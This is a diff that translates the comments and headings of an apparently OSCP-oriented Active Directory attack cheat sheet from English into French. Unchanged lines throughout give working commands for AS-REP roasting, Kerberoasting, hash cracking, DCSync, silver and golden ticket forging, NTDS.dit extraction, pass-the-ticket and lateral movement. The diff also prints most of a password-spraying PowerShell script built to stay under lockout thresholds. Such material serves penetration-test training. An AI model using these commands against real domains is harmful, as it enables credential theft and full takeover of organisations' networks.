@@ -30,7 +30,7 @@ Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePre
 ```powershell
 Rubeus.exe asreproast
 
-# The /nowrap option prevents the output from being wrapped to the next line, allowing you to see the entire output on a single line without any breaks
+# L'option /nowrap empêche la sortie d'être enveloppée à la ligne suivante, vous permettant de voir la totalité de la sortie sur une seule ligne sans interruption
 Rubeus.exe asreproast /nowrap
 ```
 
@@ -38,10 +38,10 @@ Rubeus.exe asreproast /nowrap
 <p class="oscp-command-note">Examiner les comptes sans préauthentification Kerberos.</p>
 
 ```bash
-# From Kali (GetNPUsers.py)
+# Depuis Kali (GetNPUsers.py)
 impacket-GetNPUsers -dc-ip [dc-ip] -request -outputfile [output_file].asreproast [domain.com]/[user]
 
-# From Windows
+# Depuis Windows
 GetNPUsers.py domain/[user]:[password]@[dc-ip] -no-pass
 ```
 
@@ -66,12 +66,12 @@ GetUserSPNs.py domain/[user]:[password]@[dc-ip]
 
 
 ```bash
-# From Kali
+# Depuis Kali
 sudo impacket-GetUserSPNs -request -dc-ip [dc-ip] [domain.com]/[user]
 # Autre possibilité
 sudo impacket-GetUserSPNs -request -dc-ip [dc_ip] [domain.com]/[user] -hashes [LMHASH]:[NTHASH] -outputfile [output_file]
 
-# From Windows
+# Depuis Windows
 GetUserSPNs.py domain/[user]:[password]@[dc-ip] -request
 ```
 
@@ -98,7 +98,7 @@ hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt
 <p class="oscp-command-note">Énumérer les utilisateurs du domaine.</p>
 
 ```powershell
-# 1. Find the [ServiceAccountName]
+# 1. Trouvez le [ServiceAccountName]
 Get-ADUser -Filter {ServicePrincipalName -ne $null} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
 # Autre possibilité
 Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
@@ -106,7 +106,7 @@ Get-ADUser -Filter {ServicePrincipalName -like "*MSSQL*"} -Property ServicePrinc
 # 2. Extract the NTLM hash
 mimikatz # lsadump::lsa /inject /name:[ServiceAccountName]
 
-# Example:
+# Exemple :
 mimikatz # lsadump::dcsync /user:HTTP/server01
 ```
 
@@ -114,20 +114,20 @@ mimikatz # lsadump::dcsync /user:HTTP/server01
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Tickets Silver ».</p>
 
 ```powershell
-# 1. Find the Domain SID
+# 1. Trouver le domaine SID
 (Get-ADDomain).DomainSID
 # Autre possibilité
 whoami /user
 
-# 2. Find the target server (my DC server)
+# 2. Trouvez le serveur cible (mon serveur DC)
 Get-ADDomainController -Filter *
 # Autre possibilité
 netdom query dc
 
-# 3. Create the Silver Ticket, for example in this case /service:CIFS (for help deciding the /service, check Section 12.11)
+# 3. Créer le Ticket Argent, par exemple dans ce cas /service:CIFS (pour aider à décider le /service, cochez Section 12.11)
 mimikatz # kerberos::golden /domain:[domain.com] /sid:[domainSID] /target:[targetserver] /rc4:[NTLMHash] /service:[serviceName] /user:[username]
 
-# Example:
+# Exemple :
 mimikatz # kerberos::golden /sid:S-1-5-21-1863423273-656352785-1243762498 /domain:example.com /ptt /target:server01.example.com /service:http /rc4:4d28cf5252d39971462580a51484ca09 /user:testUser
 ```
 
@@ -137,7 +137,7 @@ mimikatz # kerberos::golden /sid:S-1-5-21-1863423273-656352785-1243762498 /domai
 ```powershell
 mimikatz # kerberos::ptt silver_ticket.kirbi
 
-# Confirm the existence of the ticket
+# Confirmer l'existence du ticket
 klist
 ```
 
@@ -166,15 +166,15 @@ mimikatz # lsadump::dcsync /domain:[domain.com] /user:krbtgt
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Tickets Golden ».</p>
 
 ```powershell
-# 1. Find the Domain SID
+# 1. Trouver le domaine SID
 (Get-ADDomain).DomainSID
 # Autre possibilité
 whoami /user
 
-# 2. Find the RID: The RID for the Administrator account is 500, but other accounts will have different RIDs. You can find the RID of a specific user using tools like Mimikatz or by querying Active Directory.
+# 2. Trouvez le RID: Le RID pour le compte Administrateur est de 500, mais d'autres comptes auront des RID différents. Vous pouvez trouver le RID d'un utilisateur spécifique en utilisant des outils comme Mimikatz ou en interrogeant Active Directory.
 PowerShell -Command "(New-Object System.Security.Principal.NTAccount('domain\ServiceAccount')).Translate([System.Security.Principal.SecurityIdentifier]).Value"
 
-# 3. Create the Ticket
+# 3. Créer le ticket
 mimikatz # kerberos::golden /user:[DesiredUsername] /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:[DesiredRID]
 # Autre possibilité
 mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domainSID] /krbtgt:[KRBTGTHash] /id:500
@@ -186,7 +186,7 @@ mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domai
 ```powershell
 mimikatz # kerberos::ptt golden_ticket.kirbi
 
-# Confirm the existence of the ticket
+# Confirmer l'existence du ticket
 klist
 ```
 
@@ -198,7 +198,7 @@ net use \\domaincontroller\C$ /user:[DesiredUsername]
 ```
 
 
-## Domain Controller Synchronization (DC Sync)
+## Synchronisation des contrôleurs de domaine (DC Sync)
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -213,14 +213,14 @@ Get-ADGroupMember -Identity "Domain Admins"
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
 ```powershell
-# From Kali
+# Depuis Kali
 impacket-secretsdump [domain.com]/[adminUser]:"[password]"@[dc-ip]
-# or; the -just-dc-user [targetUser] is to only extract the hashes of the indicated user and not all the DC.
+# ou; l'utilisateur -just-dc-user [targetUser] ne doit extraire que les hachages de l'utilisateur indiqué et pas tous les DC.
 impacket-secretsdump -just-dc-user [targetUser] [domain.com]/[adminUser]:"[password]"@[dc-ip]
 
-# From Windows
+# Depuis Windows
 mimikatz # lsadump::dcsync /domain:[domain.com]
-# or; here we just extract the specified user.
+# ou ; ici nous extrayons simplement l'utilisateur spécifié.
 mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]
 ```
 
@@ -233,7 +233,7 @@ mimikatz # lsadump::dcsync /domain:[domain.com]
 
 
 ```powershell
-# You can redirect output to a file for analysis:
+# Vous pouvez rediriger la sortie vers un fichier pour analyse :
 mimikatz # lsadump::dcsync /domain:domain.com > output.txt
 ```
 
@@ -338,14 +338,14 @@ dir \\targetserver\sharedfolder
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Exécuter le script ».</p>
 
 ```powershell
-# -Pass allow us to use a single password to test.
-# We could also add the option -File to use a personalized password wordlist.
-# -Admin option is for adding test for admin account.
+# -Pass nous permet d'utiliser un seul mot de passe pour tester.
+# Nous pourrions également ajouter l'option -File pour utiliser une liste de mots de passe personnalisée.
+# -Admin option est pour ajouter un test pour compte admin.
 .\Spray-Passwords.ps1 -Pass [password] -Admin
 ```
 
 
-#### Code source of the Script
+#### Source du code du script
 
 
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Code source of the Script ».</p>
@@ -482,23 +482,23 @@ Function Get-Duration
     Return $duration
 }
 
-# Method to retrieve the user objects from the PDC
+# Méthode pour récupérer les objets utilisateurs du PDC
 Function Get-UserObjects
 {
-    # Get domain info for current domain
+    # Obtenez des informations sur le domaine actuel
     Try {$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
     Catch {Write-Verbose "No domain found, will quit..." ; Exit}
 
-    # Get the DC with the PDC emulator role
+    # Obtenez le DC avec le rôle d'émulateur PDC
     $PDC = ($domainObj.PdcRoleOwner).Name
 
-    # Build the search string from which the users should be found
+    # Construire la chaîne de recherche à partir de laquelle les utilisateurs doivent être trouvés
     $SearchString = "LDAP://"
     $SearchString += $PDC + "/"
     $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
     $SearchString += $DistinguishedName
 
-    # Create a DirectorySearcher to poll the DC
+    # Créer un chercheur d'annuaire pour le sondage sur le DC
     $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
     $objDomain = New-Object System.DirectoryServices.DirectoryEntry
     $Searcher.SearchRoot = $objDomain
@@ -508,26 +508,26 @@ Function Get-UserObjects
     $Searcher.PropertiesToLoad.Add("badpwdcount") > $Null
     $Searcher.PropertiesToLoad.Add("badpasswordtime") > $Null
 
-    # Search only for enabled users that are not locked out - avoid admins unless $admins = $true
+    # Rechercher uniquement les utilisateurs activés qui ne sont pas verrouillés - éviter les admins sauf si $admins = $true
     If ($Admins) {$Searcher.filter="(&(samAccountType=805306368)(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
     Else {$Searcher.filter="(&(samAccountType=805306368)(!(admincount=1))(!(lockoutTime>=1))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"}
     $Searcher.PageSize = 1000
 
-    # Find & return targeted user accounts
+    # Trouver et retourner des comptes utilisateurs ciblés
     $userObjs = $Searcher.FindAll()
     Return $userObjs
 }
 
-# Method to perform auth test with specific username and password
+# Méthode de test d'auth avec nom d'utilisateur et mot de passe spécifiques
 Function Perform-Authenticate
 {
     Param
     ([String]$username,[String]$password)
 
-    # Get current domain with ADSI
+    # Obtenez le domaine actuel avec ADSI
     $CurrentDomain = "LDAP://"+([ADSI]"").DistinguishedName
 
-    # Try to authenticate
+    # Essayez d'authentifier
     Write-Verbose "Trying to authenticate as user '$username' with password '$password'"
     $dom = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
     $res = $dom.Name
@@ -537,12 +537,12 @@ Function Perform-Authenticate
     Else {Return $true}
 }
 
-# Validate and parse user supplied url to CSV file of passwords
+# Valider et analyser l'utilisateur fourni url au fichier CSV de mots de passe
 Function Parse-Url
 {
     Param ([String]$url)
 
-    # Download password file from URL
+    # Télécharger le fichier de mot de passe depuis URL
     $data = (New-Object System.Net.WebClient).DownloadString($url)
     $data = $data.Split([environment]::NewLine)
 
@@ -552,7 +552,7 @@ Function Parse-Url
     Return $passwords
 }
 
-# Validate and parse user supplied CSV file of passwords
+# Valider et analyser l'utilisateur fourni fichier CSV de mots de passe
 Function Parse-File
 {
    Param ([String]$file)
@@ -600,14 +600,14 @@ Function BruteForce
    Write-Host "Performing brute force - press [q] to stop the process and print results..." -BackgroundColor Yellow -ForegroundColor Black
    :Main While ($true)
    {
-        # Get user accounts
+        # Obtenir des comptes utilisateurs
         $userObj = Get-UserObjects
 
         # Iterate over every user in AD
         For ($i = 0; $i -lt $userObj.Length; $i += 1)
         {
 
-            # Allow for manual stop of the while loop, while retaining the gathered results
+            # Permettre l'arrêt manuel de la boucle tout en conservant les résultats obtenus
             If ($Host.UI.RawUI.KeyAvailable -and ("q" -eq $Host.UI.RawUI.ReadKey("IncludeKeyUp,NoEcho").Character))
             {
                 Write-Host "Stopping bruteforce now...." -Background DarkRed
@@ -626,7 +626,7 @@ Function BruteForce
                     # Not yet reached lockout tries
                     If ($badpwdcount -lt ($threshold - 1))
                     {
-                        # Try the auth with current password
+                        # Essayez l'auth avec le mot de passe actuel
                         $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
 
                         If ($auth -eq $true)
@@ -638,7 +638,7 @@ Function BruteForce
                             $done[$i] = $true
                         }
 
-                        # Auth try did not work, go to next password in list
+                        # Auth essayer n'a pas fonctionné, aller au mot de passe suivant dans la liste
                         Else
                         {
                             $numTry[$i] += 1
@@ -684,7 +684,7 @@ Function BruteForce
                             Write-Verbose "- no badpwdtime exception '$samaccountnname':'$badpwdcount':'$badpwdtime'"
 
 
-                                   # Try the auth with current password
+                                   # Essayez l'auth avec le mot de passe actuel
                                 $auth = Perform-Authenticate $samaccountnname $passwords[$numTry[$i]]
 
                                 If ($auth -eq $true)
@@ -712,7 +712,7 @@ Function BruteForce
 
         } # User loop
 
-        # Check if the bruteforce is done so the while loop can be terminated
+        # Vérifiez si la force brute est faite ainsi la boucle peut être terminée
         $amount = 0
         For ($j = 0; $j -lt $done.Length; $j += 1)
         {
@@ -755,13 +755,13 @@ If($passwords -eq $null)
     Exit
 }
 
-# Get password policy info
+# Obtenez des informations sur la politique de mot de passe
 $duration = Get-Duration
 $threshold = Get-threshold
 
 If ($Admins) {Write-Host "WARNING: also targeting admin accounts." -BackgroundColor DarkRed}
 
-# Call the main function and start the brute force
+# Appeler la fonction principale et démarrer la force brute
 BruteForce $duration $threshold $passwords
 ```
 
@@ -779,18 +779,18 @@ BruteForce $duration $threshold $passwords
 # Fetch the current domain object
 $domainContext = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
-# Identify the Primary Domain Controller (PDC) of the domain
+# Identifier le contrôleur de domaine primaire (PDC) du domaine
 $primaryDC = ($domainContext.PdcRoleOwner).Name
 
-# Construct the LDAP path for directory access
+# Construire le chemin LDAP pour l'accès au répertoire
 $ldapPath = "LDAP://"
 $ldapPath += $primaryDC + "/"
 
-# Build the Distinguished Name (DN) for the domain structure
+# Construire le nom distingué (DN) pour la structure du domaine
 $domainDN = "DC=$($domainContext.Name.Replace('.', ',DC='))"
 $ldapPath += $domainDN
 
-# Authenticate to the directory service with specific credentials
+# Authentifier le service d'annuaire avec des références spécifiques
 $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, "[userName]", "[password]")
 ```
 
@@ -955,13 +955,13 @@ crackmapexec ntp [ip/domain]
 ```
 
 
-### Using kerbrute
+### Utilisation de kerbrute
 
 
 
 
 ```powershell
-# The executable can be found in the kerbrute GitHub (link in Section 18.3.2.2).
+# L'exécutable se trouve dans le kerbrute GitHub (lien dans la section 18.3.2.2).
 .\kerbrute_windows_amd64.exe passwordspray -d [domain.com] .\[usernames_file].txt "[password]"
 ```
 
@@ -984,10 +984,10 @@ vshadow.exe -nw -p C:
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Shadow Copies ».</p>
 
 ```powershell
-# Replace X with the shadow copy number, found in the previous command
+# Remplacer X par le numéro de copie d'ombre, trouvé dans la commande précédente
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit C:\desired\backup\path\ntds.dit.bak
 
-# Example
+# Exemple
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
 ```
 
@@ -997,7 +997,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\nt
 ```powershell
 reg.exe save hklm\system C:\backup_path\system.bak
 
-# Example
+# Exemple
 C:\> reg.exe save hklm\system c:\system.bak
 ```
 
@@ -1007,7 +1007,7 @@ C:\> reg.exe save hklm\system c:\system.bak
 ```bash
 impacket-secretsdump -ntds [ntds_file] -system [system_file] LOCAL
 
-# Example
+# Exemple
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
 
@@ -1029,7 +1029,7 @@ vssadmin list shadows
 
 
 ```powershell
-# Replace X with the shadow copy number.
+# Remplacer X par le numéro de copie d'ombre.
 mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
 ```
 
@@ -1094,7 +1094,7 @@ nmap -p 88,135,139,389,445,5985,636,3268 -sC -sV -Pn [IP]
 `CrackMapExec`  
 
 
-### Port Reference Table
+### Tableau de référence des ports
 
 Vérifier les ports et les services de la cible autorisée.
 
@@ -1295,7 +1295,7 @@ sekurlsa::tickets
 
 
 ```powershell
-# This will save .kirbi files to disk. Identify the correct TGT based on the user and encryption type.
+# Cela enregistrera les fichiers .kirbi sur le disque. Identifier le bon TGT en fonction de l'utilisateur et du type de chiffrement.
 sekurlsa::tickets /export
 ```
 
@@ -1314,34 +1314,34 @@ kerberos::ptt C:\path\to\admin_ticket.kirbi
 <p class="oscp-command-note">Interroger les informations système via WMI.</p>
 
 ```powershell
-# From Windows
+# Depuis Windows
 
-# Using VMI
+# Utilisation de VMI
 wmic /node:[target_host] process call create "cmd.exe"
 
-# Using PsExec - SysInternal (May still require plaintext creds unless SMB session picks up Kerberos ticket)
+# Utilisation de PsExec - SysInternal (Peut encore nécessiter des creds en texte simple sauf si la session SMB prend le ticket Kerberos)
 PsExec.exe \\[target_host] -u [domain]\[username] cmd.exe
 
-# Using WinRM (PowerShell Remoting)
+# Utilisation de WinRM (PowerShell Remoting)
 Enter-PSSession -ComputerName [target_host] -Authentication Kerberos -Credential [domain]\[username]
 
-# RDP: use mstsc (Remote Desktop), if TGT is injected correctly and domain trust allows it, you won’t be prompted for a password.
+# RDP: utilisez mstsc (Remote Desktop), si TGT est injecté correctement et que la confiance du domaine le permet, vous n'êtes pas invité pour un mot de passe.
 ```
 
 
 <p class="oscp-command-note">Script shell dans la rubrique « Pass-the-Ticket (PtT) ».</p>
 
 ```bash
-# From Kali
+# Depuis Kali
 
-# Transfer the .kirbi to your Kali machine (use techniques from Section 17), and then convert the .kirbi ticket
+# Transférer le .kirbi sur votre machine Kali (utiliser les techniques de la section 17), puis convertir le billet .kirbi
 kirbi2ccache [ticket_file].kirbi > [ticket_file].ccache
 export KRB5CCNAME=./[ticket_file].ccache
 
-# Using PsExec
+# Utilisation de PsExec
 psexec.py -k -no-pass [domain]/[username]@[target_host]
 
-# Using Evil-WinRM
+# Utilisation de Evil-WinRM
 evil-winrm -k -no-pass -u [username] -d [domain] -i [target_host]
 ```
 
